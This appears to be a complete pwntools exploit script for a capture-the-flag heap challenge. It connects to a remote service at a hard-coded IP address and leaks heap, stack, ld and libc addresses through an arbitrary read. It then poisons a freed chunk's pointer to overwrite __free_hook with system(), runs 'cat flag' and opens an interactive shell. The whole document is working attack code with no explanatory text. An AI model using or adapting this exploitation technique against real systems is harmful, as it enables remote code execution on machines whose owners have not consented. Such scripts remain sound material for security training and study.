from pwn import *
from heaputils import *

def create(name, nums):
	assert len(nums) == 4
	p.sendlineafter("4.exit","1")
	p.sendlineafter("input your name:",name)
	for i,x in enumerate(nums):
		p.sendlineafter("input num%d:"%(i+1),str(x))

def edit(name,nums):
	assert len(nums) == 4
	p.sendlineafter("4.exit","3")
        p.sendlineafter("input your name:",name)
        for i,x in enumerate(nums):
                p.sendlineafter("input num%d:"%(i+1),str(x))

def show():
	p.sendlineafter("4.exit","2")
	p.recvuntil("(")
	data = p.recvuntil(")").strip(")")
	data = data.split(",")
	return data

def debug():
	bp = [0x64A7,0x665E, 0x06D68]
	script = ""
	PIE = get_PIE(p)
	for x in bp:
		script += "b *0x%x\n"%(PIE+x)
	gdb.attach(p,gdbscript=script)

if __name__ == "__main__":
	libc = ELF("./libc-2.27.so")
	p = remote("207.148.126.75", 60001)

	# change type to S
	p.sendline(str(0x520))
	# show to infoleak heap
	HEAP = int(show()[0])
	log.info("HEAP: 0x%x"%HEAP)
	# switch to F
	p.sendline(str(0x521))
	

	# arbitrary read to leak stack
	edit("some dummy string", [(HEAP & 0xFFFFFFFFFFFFF000)+0x4b0, 0, 0x400, 0])
	p.sendlineafter("4.exit","2")
	data = p.recvuntil("You have a magic box.").split("\n")

	foundstk, foundld = False, False

	for x in data:
		if '[stack]' in x and not 'F(' in x and not foundstk:
			stkstart = int(x.split("-")[0],16)
			stkend = int(x.split("-")[1][:12],16)
			foundstk = True
			
		if 'ld-2.27.so' in x and not 'F(' in x and 'r' in x and not foundld:
			ldstart = int(x.split("-")[0],16)
			ldend = int(x.split("-")[1][:12],16)
			foundld = True
			

	log.info("stack: 0x%x ~ 0x%x"%(stkstart, stkend))
	log.info("ld-2.27.so: 0x%x ~ 0x%x"%(ldstart, ldend))

	# get libc from reading got of ld
	malloc_got = ldstart + 0x228020

	edit("some dummy string", [malloc_got, 0, 8, 0])
	LIBC = u64(show()[3]) - libc.symbols['malloc']
	log.info("LIBC: 0x%x"%LIBC)

	free_addr = HEAP
	free_addr = HEAP + 0x55b0c1687a90 - 0x55b0c1687a40 
	
	edit("a"*0x30, [free_addr, 1, 0x71, 0])
	p.sendline(str(0x522))
	
	# now i use create to change fd of the freed chunk
	# 4444 is the next fd
	hook = LIBC + libc.symbols['__free_hook'] - 0x58
	system = LIBC + libc.symbols['system']
	create("a"*0x30, [0x1111,0,0x71,hook])
	p.sendlineafter("4.exit","1")
	cmd = "ls -al; cat flag"
	p.sendlineafter("input your name:",cmd.ljust(0x57," ")+";"+p64(system))


	p.interactive()
